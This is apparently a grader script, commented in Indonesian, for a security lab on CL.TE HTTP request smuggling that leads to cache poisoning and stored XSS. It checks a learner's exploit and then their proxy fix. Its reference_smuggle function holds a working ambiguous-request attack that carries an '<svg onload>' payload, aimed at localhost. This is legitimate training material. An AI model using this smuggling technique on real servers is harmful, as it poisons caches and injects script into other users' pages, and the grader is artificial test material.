#!/usr/bin/env python3
"""Verifier otomatis 2 fase untuk Lab 8.

Rantai: CL.TE request smuggling -> cache poisoning -> stored XSS
(emulasi HackerOne #488147, PayPal).

Hanya memakai Python stdlib (tanpa dependency), butuh `docker compose`
di host.

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - baseline GET / dan GET /signin       -> 200 (bersih)
      - POST / Content-Length saja           -> 200 (fungsi normal)
      - POST / chunked saja                  -> 200 (fungsi normal)
      - serangan referensi (health)          -> request ambigu diterima;
        GET /signin + Cache-Control: no-cache mengambil racun dari
        antrean backend dan menyimpannya di cache; GET /signin biasa
        lalu HIT racun (200 + MARKER)
      - exploit/exploit.py milik learner dijalankan -> mencetak
        STATUS: 200 + POISONED_URL: /signin; pemeriksaan independen:
        GET /signin biasa keracuni, atau (bila belum) probe no-cache
        membuktikan racun memang bisa diambil
  FASE 2 (dengan fix/): bangun ulang proxy dari fix/proxy, pastikan
      - serangan referensi GAGAL             -> 400, tidak diteruskan,
        cache bersih (GET /signin 200 tanpa MARKER)
      - fungsi normal utuh                   -> GET /, GET /signin,
        POST / (CL saja / chunked saja) 200

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/proxy/proxy.py identik byte-per-byte dengan
    proxy/proxy.py (pristine) -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import filecmp
import os
import re
import shutil
import socket
import subprocess
import sys
import time
from urllib.parse import quote

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
MARKER = b"POISON8"
PAYLOAD = "POISON8<svg onload=alert(1)>"
PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " -- " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=10)
        self.rf = self.s.makefile("rb")

    def read_response(self):
        line = self.rf.readline(65536)
        if not line:
            return 0, b""
        parts = line.decode("latin-1").rstrip("\r\n").split(" ", 2)
        try:
            status = int(parts[1])
        except (IndexError, ValueError):
            return 0, b""
        headers = {}
        while True:
            h = self.rf.readline(65536)
            if not h:
                break
            h = h.decode("latin-1").rstrip("\r\n")
            if h == "":
                break
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip().lower()] = v.strip()
        try:
            n = int(headers.get("content-length", "0") or "0")
        except ValueError:
            n = 0
        body = b""
        while len(body) < n:
            chunk = self.rf.read(n - len(body))
            if not chunk:
                break
            body += chunk
        return status, body

    def request(self, payload):
        self.s.sendall(payload)
        return self.read_response()

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


def get(path, no_cache=False):
    extra = "Cache-Control: no-cache\r\n" if no_cache else ""
    c = Conn()
    try:
        return c.request(
            ("GET %s HTTP/1.1\r\nHost: %s:%d\r\n%sConnection: close\r\n\r\n"
             % (path, HOST, PORT, extra)).encode("latin-1"))
    finally:
        c.close()


def post_cl(path):
    c = Conn()
    try:
        return c.request(
            ("POST %s HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: 0\r\n"
             "Connection: close\r\n\r\n" % (path, HOST, PORT)).encode("latin-1"))
    finally:
        c.close()


def post_te_chunked(path):
    body = b"5\r\nhello\r\n0\r\n\r\n"
    c = Conn()
    try:
        return c.request(
            ("POST %s HTTP/1.1\r\nHost: %s:%d\r\nTransfer-Encoding: chunked\r\n"
             "Connection: close\r\n\r\n" % (path, HOST, PORT)).encode("latin-1") + body)
    finally:
        c.close()


def reference_smuggle():
    """Request ambigu CL.TE: request kedua disembunyikan di dalam body CL.

    Kembalikan (status1, body1) respons untuk request luar;
    (0, b"") bila koneksi diputus tanpa respons.
    """
    smuggled = (
        "GET /signin?msg=" + quote(PAYLOAD, safe="") + " HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "\r\n" % (HOST, PORT)
    ).encode("latin-1")
    body = b"0\r\n\r\n" + smuggled
    outer = (
        "POST / HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Length: %d\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n" % (HOST, PORT, len(body))
    ).encode("latin-1") + body
    c = Conn()
    try:
        c.s.sendall(outer)
        return c.read_response()
    finally:
        c.close()


def wait_up(timeout=150):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            st, _ = get("/")
            if st == 200:
                return True
        except OSError:
            pass
        time.sleep(2)
    return False


def compose_down():
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])


def parse_exploit_output(out):
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_url = re.search(r"^POISONED_URL:\s*(\S+)\s*$", out, re.MULTILINE)
    return (m_status.group(1) if m_status else None,
            m_url.group(1) if m_url else None)


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    log("== bersih-bersih container lama ==")
    compose_down()

    # ---------------- FASE 1 ----------------
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, body = get("/")
    check("baseline GET / -> 200", st == 200, "dapat %s" % st)
    st, body = get("/signin")
    check("baseline GET /signin -> 200 bersih", st == 200 and MARKER not in body,
          "dapat %s" % st)
    st, _ = post_cl("/")
    check("fungsi normal: POST / (Content-Length saja) -> 200", st == 200,
          "dapat %s" % st)
    st, _ = post_te_chunked("/")
    check("fungsi normal: POST / (chunked saja) -> 200", st == 200,
          "dapat %s" % st)

    st1, _b1 = reference_smuggle()
    st2, b2 = get("/signin", no_cache=True)
    st3, b3 = get("/signin")
    ok = (st1 == 200 and st2 == 200 and MARKER in b2
          and st3 == 200 and MARKER in b3)
    check("serangan referensi: ambigu diterima, no-cache ambil racun, "
          "GET biasa HIT racun", ok,
          "resp1=%s no-cache=%s biasa=%s" % (st1, st2, st3))
    if not ok:
        log("LAB RUSAK: serangan referensi gagal di definisi pristine.")
        compose_down()
        sys.exit(1)

    log("== FASE 1: reset ke pristine segar untuk exploit learner ==")
    compose_down()
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    log("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    exp = os.path.join(LAB_DIR, "exploit", "exploit.py")
    try:
        p = subprocess.run([sys.executable, exp], capture_output=True,
                           text=True, timeout=60, cwd=os.path.dirname(exp))
    except subprocess.TimeoutExpired:
        log("exploit.py melebihi 60 detik.")
        compose_down()
        sys.exit(1)
    if "NotImplementedError" in (p.stderr or ""):
        log("exploit.py masih scaffold (NotImplementedError). Kerjakan fase 1 dulu.")
        compose_down()
        sys.exit(3)
    status, purl = parse_exploit_output(p.stdout or "")
    check("exploit mencetak STATUS: 200", status == "200",
          "dapat %r" % status)
    check("exploit mencetak POISONED_URL: /signin", purl == "/signin",
          "dapat %r" % purl)

    st, body = get("/signin")
    poisoned = (st == 200 and MARKER in body)
    if not poisoned:
        # Learner mungkin hanya menyelundupkan tanpa mengambil racun:
        # probe no-cache membuktikan racun memang bisa diambil.
        st, body = get("/signin", no_cache=True)
        poisoned = (st == 200 and MARKER in body)
    check("pemeriksaan independen: GET /signin keracuni (200 + racun)",
          poisoned, "dapat %s" % st)

    compose_down()

    # ---------------- FASE 2 ----------------
    log("== FASE 2: cek scaffold fix ==")
    pristine = os.path.join(LAB_DIR, "proxy", "proxy.py")
    fixed = os.path.join(LAB_DIR, "fix", "proxy", "proxy.py")
    if filecmp.cmp(pristine, fixed, shallow=False):
        log("fix/proxy/proxy.py masih identik dengan pristine. Kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st1, _b1 = reference_smuggle()
    check("serangan referensi GAGAL: request ambigu -> 400", st1 == 400,
          "dapat %s" % st1)
    st, body = get("/signin", no_cache=True)
    check("cache bersih: GET /signin (no-cache) -> 200 tanpa racun",
          st == 200 and MARKER not in body, "dapat %s" % st)
    st, body = get("/signin")
    check("cache bersih: GET /signin biasa -> 200 tanpa racun",
          st == 200 and MARKER not in body, "dapat %s" % st)
    st, _ = get("/")
    check("fungsi normal: GET / -> 200", st == 200, "dapat %s" % st)
    st, _ = post_cl("/")
    check("fungsi normal: POST / (Content-Length saja) -> 200", st == 200,
          "dapat %s" % st)
    st, _ = post_te_chunked("/")
    check("fungsi normal: POST / (chunked saja) -> 200", st == 200,
          "dapat %s" % st)

    compose_down()

    failed = [n for (n, ok) in results if not ok]
    log("== HASIL: %d/%d cek lulus ==" % (len(results) - len(failed), len(results)))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
